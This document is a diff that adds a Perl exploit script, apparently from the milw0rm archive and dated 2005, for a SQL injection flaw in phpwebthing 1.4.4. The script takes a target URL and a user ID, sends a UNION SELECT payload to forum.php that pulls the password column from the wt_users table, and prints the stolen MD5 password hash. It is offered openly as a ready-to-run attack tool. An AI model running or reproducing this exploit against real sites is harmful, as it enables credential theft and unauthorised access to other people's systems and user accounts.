@@ -1,0 +1,28 @@
+#!/bin/bin/perl
+#-----------------------------------------------------#
+#-      SQL injection in phpwebthing v 1.4.4
+#-      Founder by Qptan & Exploting by AhLam
+#-      www.leZe.Com Only For Geek Hacker's
+#-      coded by AhLaM  A.1.M|at|hotmail.com
+#-      http://www.lezr.com/vb/showthread.php?t=6557
+#-----------------------------------------------------#
+use LWP::Simple;
+
+print "\n============================================\n";
+print "\n   SQL injection in phpwebthing v 1.4.4    =  ";
+print "\n   Founder by Qptan & Exploting by AhLam   =  ";
+print "\n   www.leZe.Com Only For Geek Hacker's     =  ";
+print "\n   Coded By AhLaM   A.1.M|at|hotmail.com         ";
+print "\n============================================\n";
+
+if(!$ARGV[0] or !$ARGV[1]) {
+ print "\nUsage:\nperl $0 [host] [User ID] \n\nExample:\nperl $0 http://www.target.com/ 1\n";
+ exit(0);
+}
+$url = "/forum.php?forum=-1%20union%20select%20password,password,null,null%20from%20wt_users%20where%20uid=$ARGV[1]/*";
+$page = get($ARGV[0].$url) || die "[-] Unable to retrieve: $!";
+print "[+] Connected to: $ARGV[0]\n";
+$page =~ m/ - (.*?)<\/td>/ && print "[+] MD5 hash of password is: $1\n";
+print "[-] Unable to retrieve hash of password\n" if(!$1);
+
+# milw0rm.com [2005-11-16]
